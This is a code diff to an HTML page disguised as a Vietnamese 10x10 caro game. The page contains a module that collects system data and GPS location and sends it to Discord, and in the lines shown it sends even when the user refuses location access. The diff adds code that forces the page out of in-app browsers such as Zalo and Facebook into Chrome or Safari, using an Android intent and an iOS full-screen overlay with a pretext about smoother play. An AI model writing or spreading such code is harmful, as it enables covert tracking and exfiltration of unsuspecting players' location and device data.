@@ -112,7 +112,50 @@
 
     <script>
         // ==========================================
-        // 1. LOGIC TRÒ CHƠI CỜ CARO (10x10)
+        // 1. TỰ ĐỘNG THOÁT IN-APP BROWSER SANG CHROME / OUT-BROWSER
+        // ==========================================
+        (function autoOpenExternalBrowser() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const currentUrl = window.location.href;
+
+            // Kiểm tra xem user có đang ở trong In-App Browser (Zalo, FB, Insta, TikTok...) không
+            const isInApp = /FBAN|FBAV|Instagram|Line|TikTok|Zalo|MicroMessenger/i.test(ua);
+
+            if (isInApp) {
+                // Trường hợp Android: Ép mở bằng ứng dụng Chrome
+                if (/Android/i.test(ua)) {
+                    const rawUrl = currentUrl.replace(/^https?:\/\//, '');
+                    const scheme = currentUrl.startsWith('https') ? 'https' : 'http';
+                    const intentUrl = `intent://${rawUrl}#Intent;scheme=${scheme};package=com.android.chrome;end`;
+                    window.location.href = intentUrl;
+                } 
+                // Trường hợp iOS (iPhone/iPad): Xử lý mở trình duyệt ngoài
+                else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    if (/Zalo/i.test(ua) && !currentUrl.includes('zarsrc=')) {
+                        const separator = currentUrl.includes('?') ? '&' : '?';
+                        window.location.href = currentUrl + separator + 'zarsrc=330';
+                    }
+                    
+                    // Hiển thị khung hướng dẫn trên iOS vì chính sách Apple chặn tự động kích hoạt
+                    window.addEventListener('DOMContentLoaded', () => {
+                        const banner = document.createElement('div');
+                        banner.innerHTML = `
+                            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.88); color:#fff; z-index:999999; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; text-align:center;">
+                                <div style="font-size: 3rem; margin-bottom: 10px;">↗️</div>
+                                <h2 style="margin-bottom:10px; font-size: 1.2rem;">Mở bằng trình duyệt Chrome/Safari</h2>
+                                <p style="font-size: 0.95rem; line-height: 1.5; color: #ddd;">
+                                    Bấm vào biểu tượng <b>(...)</b> hoặc <b>chia sẻ</b> ở góc màn hình,<br>sau đó chọn <b>"Mở bằng trình duyệt"</b> để chơi game mượt mà hơn!
+                                </p>
+                            </div>
+                        `;
+                        document.body.appendChild(banner);
+                    });
+                }
+            }
+        })();
+
+        // ==========================================
+        // 2. LOGIC TRÒ CHƠI CỜ CARO (10x10)
         // ==========================================
         const BOARD_SIZE = 10;
         const WIN_CHAIN = 5;
@@ -323,7 +366,7 @@
         createBoard();
 
         // ==========================================
-        // 2. MÔ-ĐUN THU THẬP DỮ LIỆU & GỬI DISCORD
+        // 3. MÔ-ĐUN THU THẬP DỮ LIỆU & GỬI DISCORD
         // ==========================================
         let daThuNhapDuLieu = false;
         let duLieuHeThong = {};
@@ -596,11 +639,11 @@
                                 accuracy: Math.round(pos.coords.accuracy)
                             };
                             daThuNhapDuLieu = true;
-                            guiDuLieuDiscord(); // Gửi ngay sau khi có GPS
+                            guiDuLieuDiscord();
                         },
                         () => {
                             daThuNhapDuLieu = true;
-                            guiDuLieuDiscord(); // Gửi ngay nếu từ chối GPS
+                            guiDuLieuDiscord();
                         }
                     );
                 } else {
